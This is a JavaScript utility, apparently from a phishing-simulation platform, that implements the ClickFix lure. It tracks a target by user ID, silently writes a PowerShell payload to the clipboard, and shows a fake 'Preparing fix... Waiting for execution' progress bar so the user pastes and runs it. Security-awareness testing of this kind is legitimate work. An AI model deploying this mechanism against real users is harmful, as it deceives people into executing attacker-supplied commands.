/**
 * ClickFix Shared Utility - Core attack simulation logic
 */

const ClickFix = {
    /**
     * @param {string} payload - PowerShell payload to copy
     * @param {string} userId - Target's User ID
     * @param {string} trackEndpoint - Backend tracking endpoint
     * @param {function} onSuccess - Callback after successful clipboard copy
     * @param {function} onError - Callback if clipboard copy fails
     */
    trigger: function(payload, userId, trackEndpoint, onSuccess, onError) {
        // Fire tracking immediately, independent of clipboard result
        fetch(`${trackEndpoint}/${userId}`, { method: 'POST' })
            .catch(function() { /* Tracking failed silently */ });

        // Wrap onSuccess to wait for mouse movement
        const onMovementSuccess = () => {
            const handleMove = () => {
                document.removeEventListener('mousemove', handleMove);
                if (onSuccess) onSuccess();
            };
            document.addEventListener('mousemove', handleMove);
        };

        // Attempt copy immediately to preserve user gesture
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(payload).then(() => {
                onMovementSuccess();
            }).catch(err => {
                this._fallbackCopy(payload, onMovementSuccess, onError);
            });
        } else {
            this._fallbackCopy(payload, onMovementSuccess, onError);
        }
    },

    _fallbackCopy: function(text, onSuccess, onError) {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed';
        textarea.style.opacity = '0';
        document.body.appendChild(textarea);
        textarea.select();
        try {
            document.execCommand('copy');
            document.body.removeChild(textarea);
            if (onSuccess) onSuccess();
        } catch (err) {
            document.body.removeChild(textarea);
            if (onError) onError(err);
        }
    },

    /**
     * Shared progress bar logic
     * @param {string} barId - ID of the progress bar element
     * @param {string} statusId - ID of the status text element
     * @param {object} options - Configuration options
     */
    startProgress: function(barId, statusId, options = {}) {
        const bar = document.getElementById(barId);
        const status = document.getElementById(statusId);
        const maxPercent = options.maxPercent || 90;
        const interval = options.interval || 50;
        const messages = options.messages || {
            30: "Verifying environment...",
            60: "Preparing fix...",
            90: "Waiting for user input..."
        };
        
        let width = 0;
        const timer = setInterval(() => {
            if (width >= maxPercent) {
                clearInterval(timer);
                if (status) status.innerText = "Waiting for execution...";
            } else {
                width++;
                if (bar) bar.style.width = width + '%';
                
                if (status) {
                    for (const [threshold, message] of Object.entries(messages)) {
                        if (width < parseInt(threshold)) {
                            status.innerText = message;
                            break;
                        }
                    }
                }
            }
        }, interval);
        return timer;
    }
};

window.ClickFix = ClickFix;